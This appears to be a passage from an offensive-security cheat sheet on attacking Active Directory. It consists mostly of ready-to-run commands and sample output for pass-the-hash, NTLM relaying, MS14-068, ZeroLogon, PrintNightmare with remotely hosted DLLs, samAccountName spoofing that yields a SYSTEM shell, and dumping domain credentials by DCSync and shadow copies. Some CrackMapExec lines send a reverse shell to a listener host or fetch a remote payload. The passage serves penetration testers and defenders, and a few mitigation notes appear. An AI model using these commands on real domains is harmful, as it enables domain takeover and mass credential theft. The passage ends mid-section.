# Active Directory Attacks

## Summary

- [Active Directory Attacks](#active-directory-attacks)
  - [Summary](#summary)
  - [Tools](#tools)
  - [From CVE to SYSTEM shell on DC](#from-cve-to-system-shell-on-dc)
    - [MS14-068 Checksum Validation](#ms14-068-checksum-validation)
    - [ZeroLogon](#zerologon)
    - [PrintNightmare](#printnightmare)
    - [samAccountName spoofing](#samaccountname-spoofing)
  - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
    - [DCSync Attack](#dcsync-attack)
    - [Volume Shadow Copy](#volume-shadow-copy)
    - [Extract hashes from ntds.dit](#extract-hashes-from-ntdsdit)
    - [Using Mimikatz sekurlsa](#using-mimikatz-sekurlsa)
    - [Crack NTLM hashes with hashcat](#crack-ntlm-hashes-with-hashcat)
    - [NTDS Reversible Encryption](#ntds-reversible-encryption)
  - [User Hunting](#user-hunting)
  - [Pass-the-Hash](#pass-the-hash)
  - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
    - [Using impacket](#using-impacket)
    - [Using Rubeus](#using-rubeus)
  - [Capturing and cracking Net-NTLMv1/NTLMv1 hashes](#capturing-and-cracking-net-ntlmv1ntlmv1-hashes)
  - [Capturing and cracking Net-NTLMv2/NTLMv2 hashes](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
  - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
    - [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
    - [LDAP signing not required and LDAP channel binding disabled](#ldap-signing-not-required-and-ldap-channel-binding-disabled)
    - [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
    - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
    - [Drop the MIC](#drop-the-mic)
    - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
    - [RemotePotato0 DCOM DCE RPC relay](#remotepotato0-dcom-dce-rpc-relay)
    - [DNS Poisonning - Relay delegation with mitm6](#dns-poisonning---relay-delegation-with-mitm6)
    - [Relaying with WebDav Trick](#relaying-with-webdav-trick)
  - [UnPAC The Hash](#unpac-the-hash)
  - [Shadow Credentials](#shadow-credentials)
  - [Active Directory Federation Services](#active-directory-federation-services)
    - [ADFS - Golden SAML](#adfs---golden-saml)
  - [Active Directory Integrated DNS](#active-directory-integrated-dns)
  - [Trust relationship between domains](#trust-relationship-between-domains)
  - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
  - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
  - [Privileged Access Management (PAM) Trust](#privileged-access-management-pam-trust)
  - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
    - [SpoolService Abuse with Unconstrained Delegation](#spoolservice-abuse-with-unconstrained-delegation)
    - [MS-EFSRPC Abuse with Unconstrained Delegation](#ms---efsrpc-abuse-with-unconstrained-delegation)
  - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
  - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
  - [Kerberos Service for User Extension](#kerberos-service-for-user-extension)
    - [S4U2self - Privilege Escalation](#s4u2self---privilege-escalation)
  - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
  - [PrivExchange attack](#privexchange-attack)
  - [PXE Boot image attack](#pxe-boot-image-attack)
  - [DSRM Credentials](#dsrm-credentials)
  - [DNS Reconnaissance](#dns-reconnaissance)
  - [References](#references)

## Tools

* [Impacket](https://github.com/CoreSecurity/impacket) or the [Windows version](https://github.com/maaaaz/impacket-examples-windows)
* [Responder](https://github.com/lgandx/Responder)
* [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Ranger](https://github.com/funkandwagnalls/ranger)
* [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
* [CrackMapExec](https://github.com/mpgn/CrackMapExec)

  ```powershell
  # use the latest release, CME is now a binary packaged will all its dependencies
  root@payload$ wget https://github.com/mpgn/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip

  # execute cme (smb, winrm, mssql, ...)
  root@payload$ cme smb -L
  root@payload$ cme smb -M name_module -o VAR=DATA
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
  root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
  root@payload$ cme mimikatz --server http --server-port 80
  ```

* [Mitm6](https://github.com/fox-it/mitm6.git)

  ```bash
  git clone https://github.com/fox-it/mitm6.git && cd mitm6
  pip install .
  mitm6 -d lab.local
  ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
  # -wh: Server hosting WPAD file (Attacker’s IP)
  # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
  # -i: open an interactive shell
  ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
  ```

* [ADRecon](https://github.com/sense-of-security/ADRecon)

  ```powershell
  .\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
  ```

* [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
    ```

* [Ping Castle](https://github.com/vletoux/pingcastle)

    ```powershell
    pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
    pingcastle.exe --healthcheck --server domain.local
    pingcastle.exe --graph --server domain.local
    pingcastle.exe --scanner scanner_name --server domain.local
    available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users
    ```

* [Kerbrute](https://github.com/ropnop/kerbrute)

    ```powershell
    ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
    ```

* [Rubeus](https://github.com/GhostPack/Rubeus)

    ```powershell
    Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
    Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
    Rubeus.exe klist [/luid:LOGINID]
    Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
    ```

* [AutomatedLab](https://github.com/AutomatedLab/AutomatedLab)
    ```powershell
    New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
    Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'
    Install-Lab
    Show-LabDeploymentSummary
    ```


## From CVE to SYSTEM shell on DC

> Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you can also try to elevate your privileges using one of the methods listed in [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)


### MS14-068 Checksum Validation

This exploit require to know the user SID, you can use `rpcclient` to remotely get it or `wmi` if you have an access on the machine.

* RPCClient
  ```powershell
  rpcclient $> lookupnames john.smith
  john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)
  ```
* WMI
  ```powershell
  wmic useraccount get name,sid
  Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
  Guest          S-1-5-21-3415849876-833628785-5197346142-501   
  Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
  Guest          S-1-5-21-297520375-2634728305-5197346142-501   
  krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
  lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
  ```
* Powerview
  ```powershell
  Convert-NameToSid high-sec-corp.localkrbtgt
  S-1-5-21-2941561648-383941485-1389968811-502
  ```
* CrackMapExec: `crackmapexec ldap DC1.lab.local -u username -p password -k --get-sid`  

```bash
Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
```

Generate a ticket with `metasploit` or `pykek`

```powershell
Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
   Name      Current Setting                                Required  Description
   ----      ---------------                                --------  -----------
   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL
   PASSWORD  P@ssw0rd                                       yes       The Domain User password
   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier
   RPORT     88                                             yes       The target port
   Timeout   10                                             yes       The TCP timeout to establish connection and read data
   USER      lambda                                         yes       The Domain User
   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000
```

```powershell
# Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
$ git clone https://github.com/SecWiki/windows-kernel-exploits
$ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
-1105
  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!
```

Then use `mimikatz` to load the ticket.

```powershell
mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
```


#### Mitigations

* Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780


### ZeroLogon

> CVE-2020-1472

White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055

Exploit steps from the white paper

1. Spoofing the client credential
2. Disabling signing and sealing
3. Spoofing a call
4. Changing a computer's AD password to null
5. From password change to domain admin
6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service

* `cve-2020-1472-exploit.py` - Python script from [dirkjanm](https://github.com/dirkjanm)
  ```powershell
	# Check (https://github.com/SecuraBV/CVE-2020-1472)
	proxychains python3 zerologon_tester.py DC01 172.16.1.5
	
  $ git clone https://github.com/dirkjanm/CVE-2020-1472.git

  # Activate a virtual env to install impacket
  $ python3 -m venv venv
  $ source venv/bin/activate
  $ pip3 install .
	
  # Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
  proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5

  # Find the old NT hash of the DC
  proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'

  # Restore password from secretsdump 
  # secretsdump will automatically dump the plaintext machine password (hex encoded) 
  # when dumping the local registry secrets on the newest version
  python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
  deactivate
  ```

* `nccfsas` - .NET binary for Cobalt Strike's execute-assembly
  ```powershell
  git clone https://github.com/nccgroup/nccfsas
  # Check
  execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local

  # Resetting the machine account password
  execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset

  # Testing from a non Domain-joined machine
  execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch

  # Now reset the password back
  ```

* `Mimikatz` - 2.2.0 20200917 Post-Zerologon
  ```powershell
  privilege::debug
  # Check for the CVE
  lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$

  # Exploit the CVE and set the computer account's password to ""
  lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit

  # Execute dcsync to extract some hashes
  lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
  lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm

  # Pass The Hash with the extracted Domain Admin hash
  sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN

  # Use IP address instead of FQDN to force NTLM with Windows APIs 
  # Reset password to Waza1234/Waza1234/Waza1234/
  # https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
  lsadump::postzerologon /target:10.10.10.10 /account:DC01$
  ```

* `CrackMapExec` - only check
  ```powershell
  crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
  ```
  
A 2nd approach to exploit zerologon is done by relaying authentication.

This technique, [found by dirkjanm](https://dirkjanm.io/a-different-way-of-abusing-zerologon), requires more prerequisites but has the advantage of having no impact on service continuity.
The following prerequisites are needed:
* A domain account
* One DC running the `PrintSpooler` service
* Another DC vulnerable to zerologon

* `ntlmrelayx` - from Impacket and any tool such as [`printerbug.py`](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
  ```powershell
  # Check if one DC is running the PrintSpooler service
  rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"
  
  # Setup ntlmrelay in one shell
  ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
  
  #Trigger printerbug in 2nd shell
  python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
  ```

### PrintNightmare

> CVE-2021-1675 / CVE-2021-34527

The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
The exploit will execute the DLL either from the local filesystem or a remote share.

Requirements:
* **Spooler Service** enabled (Mandatory)
* Server with patches < June 2021
* DC with `Pre Windows 2000 Compatibility` group
* Server with registry key `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1
* Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0


**Detect the vulnerability**:
* Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)
  ```ps1
  python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
  Protocol: [MS-RPRN]: Print System Remote Protocol
  ```
* [It Was All A Dream](https://github.com/byt3bl33d3r/ItWasAllADream) 
  ```ps1
  git clone https://github.com/byt3bl33d3r/ItWasAllADream
  cd ItWasAllADream && poetry install && poetry shell
  itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
  docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
  ```

**Payload Hosting**: 
* The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109):
```ps1
python3 ./smbserver.py share /tmp/smb/
```
* Using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) (Admin rights required on host): 
```ps1
Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
```
* Using WebDav with [SharpWebServer](https://github.com/mgeeky/SharpWebServer) (Doesn't require admin rights):
```ps1
SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
```
When using WebDav instead of SMB, you must add `@[PORT]` to the hostname in the URI, e.g.: `\\172.16.1.5@8888\Downloads\beacon.dll`
WebDav client **must** be activated on exploited target. By default it is not activated on Windows workstations (you have to `net start webclient`) and it's not installed on servers. Here is how to detect activated webdav:
```ps1
cme smb -u user -p password -d domain.local -M webdav [TARGET]
```

**Trigger the exploit**: 

* [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)
  ```powershell
  # require a modified Impacket: https://github.com/cube0x0/impacket
  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
  ## LPE
  SharpPrintNightmare.exe C:\addCube.dll
  ## RCE using existing context
  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
  ## RCE using runas /netonly
  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
  ```
* [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)
  ```powershell
  ## LPE only (PS1 + DLL)
  Import-Module .\cve-2021-1675.ps1
  Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
  Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
  Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
  ```
* [Mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)
  ```powershell
  ## LPE
  misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
  ## RCE
  misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
  ```
* [PrintNightmare - @outflanknl](https://github.com/outflanknl/PrintNightmare)
  ```powershell
  PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]
  ```

**Debug informations**

| Error  | Message             | Debug                                    |
|--------|---------------------|------------------------------------------|
| 0x5    | `rpc_s_access_denied` | Permissions on the file in the SMB share |
| 0x525  | `ERROR_NO_SUCH_USER`  | The specified account does not exist.    |
| 0x180  | unknown error code  | Share is not SMB2                        |


### samAccountName spoofing

> During S4U2Self, the KDC will try to append a '\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.

**Requirements**

* MachineAccountQuota > 0

**Check for exploitation**

0. Check the MachineAccountQuota of the account
  ```powershell
  crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ
  StandIn.exe --object ms-DS-MachineAccountQuota=*
  ```
1. Check if the DC is vulnerable
  ```powershell
  crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
  ```

**Exploitation**

0. Create a computer account
    ```powershell
    impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

    powermad@windows> . .\Powermad.ps1
    powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
    powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

    sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
    ```
1. Clear the controlled machine account `servicePrincipalName` attribute
    ```ps1
    impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

    powershell@windows> . .\Powerview.ps1
    powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
    ```
2. (CVE-2021-42278) Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$`
    ```ps1
    # https://github.com/SecureAuthCorp/impacket/pull/1224
    impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
    ```
3. Request a TGT for the controlled machine account
    ```ps1
    impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

    cmd@windows> Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
    ```
4. Reset the controlled machine account sAMAccountName to its old value 
    ```ps1
    impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
    ```
5. (CVE-2021-42287) Request a service ticket with `S4U2self` by presenting the TGT obtained before
    ```ps1
    # https://github.com/SecureAuthCorp/impacket/pull/1202
    impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

    cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
    ```
6. DCSync: `KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'`

Automated exploitation:

* [cube0x0/noPac](https://github.com/cube0x0/noPac) - Windows
    ```powershell
    noPac.exe scan -domain htb.local -user user -pass 'password123'
    noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
    noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
    ```
* [Ridter/noPac](https://github.com/Ridter/noPac) - Linux
  ```ps1
  python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
  ```
* [WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin)
    ```ps1
    $ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
    [*] Selected Target dc.caltech.white                                              
    [*] Total Domain Admins 11                                                        
    [*] will try to impersonat gaylene.dreddy                                         
    [*] Current ms-DS-MachineAccountQuota = 10                                        
    [*] Adding Computer Account "SAMTHEADMIN-11$"                                     
    [*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                      
    [*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.
    [*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   
    [*] SAMTHEADMIN-11$ sAMAccountName == dc                                          
    [*] Saving ticket in dc.ccache                                                    
    [*] Resting the machine account to SAMTHEADMIN-11$                                
    [*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     
    [*] Using TGT from cache                                                          
    [*] Impersonating gaylene.dreddy                                                  
    [*]     Requesting S4U2self                                                       
    [*] Saving ticket in gaylene.dreddy.ccache                                        
    [!] Launching semi-interactive shell - Careful what you execute                   
    C:\Windows\system32>whoami                                                        
    nt authority\system 
    ```
* [ly4k/Pachine](https://github.com/ly4k/Pachine)
    ```powershell
    usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]
                  [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
                  [domain/]username[:password]
    $ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'
    $ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'
    $ export KRB5CCNAME=$PWD/administrator@domain.local.ccache
    $ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'
    ```

**Mitigations**:
* [KB5007247 - Windows Server 2012 R2](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007247-monthly-rollup-2c3b6017-82f4-4102-b1e2-36f366bf3520)
* [KB5008601 - Windows Server 2016](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008601-os-build-14393-4771-out-of-band-c8cd33ce-3d40-4853-bee4-a7cc943582b9)
* [KB5008602 - Windows Server 2019](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7)
* [KB5007205 - Windows Server 2022](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007205-os-build-20348-350-af102e6f-cc7c-4cd4-8dc2-8b08d73d2b31)
* [KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)
* [KB5008380](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)



## Dumping AD Domain Credentials

You will need the following files to extract the ntds : 
- NTDS.dit file
- SYSTEM hive (`C:\Windows\System32\SYSTEM`)

Usually you can find the ntds in two locations : `systemroot\NTDS\ntds.dit` and `systemroot\System32\ntds.dit`.
- `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
- `systemroot\System32\ntds.dit` is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.

However you can change the location to a custom one, you will need to query the registry to get the current location.

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
```

### DCSync Attack

DCSync is a technique used by attackers to obtain sensitive information, including password hashes, from a domain controller in an Active Directory environment. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. 

* DCSync only one user
  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
  ```
* DCSync all users of the domain
  ```powershell
  mimikatz# lsadump::dcsync /domain:htb.local /all /csv

  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
  ```

> :warning: OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.


### Volume Shadow Copy

The VSS is a Windows service that allows users to create snapshots or backups of their data at a specific point in time. Attackers can abuse this service to access and copy sensitive data, even if it is currently being used or locked by another process.

* [windows-commands/vssadmin](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin)
  ```powershell
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
  ```
* [windows-commands/ntdsutil](https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/use-ntdsutil-manage-ad-files)
  ```powershell
  ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
  ```
* [CrackMapExec VSS module](https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-ntds.dit)
  ```powershell
